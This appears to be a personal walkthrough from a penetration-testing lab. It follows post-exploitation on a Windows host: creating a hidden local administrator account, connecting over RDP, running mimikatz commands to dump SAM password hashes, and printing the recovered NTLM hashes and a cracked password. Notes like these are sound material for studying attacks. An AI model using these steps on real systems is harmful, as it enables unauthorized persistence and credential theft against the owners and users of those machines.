Now that we have a root shell on the windows box .150 

First we create the account itself:  
`net user USERNAME PASSWORD /add`  

user: keez pw: asdf123

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  
`net localgroup Administrators USERNAME /add  
net localgroup "Remote Management Users" USERNAME /add`

We can now rdp to this box for stable access. 


---

I chose to use xfreerdp and mount windows-resources from attack box

`xfreerdp /v:10.200.84.150 /u:keez /p:asdf123 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`

___

We can now use mimikatz to dump local account password hashes
Open up cmd with admin priviledges

With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:  
`privilege::debug  
token::elevate`

Then dump the SAM local password hashes
`lsadump::sam`

---

We now have the administrator hashes

Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

And Thomas

RID  : 000003e9 (1001)
User : Thomas
Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Using Crackstation, we see Thomas' password is **i<3ruby**


from [[enumeration 03]] we know the following ports are open:

```bash
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```



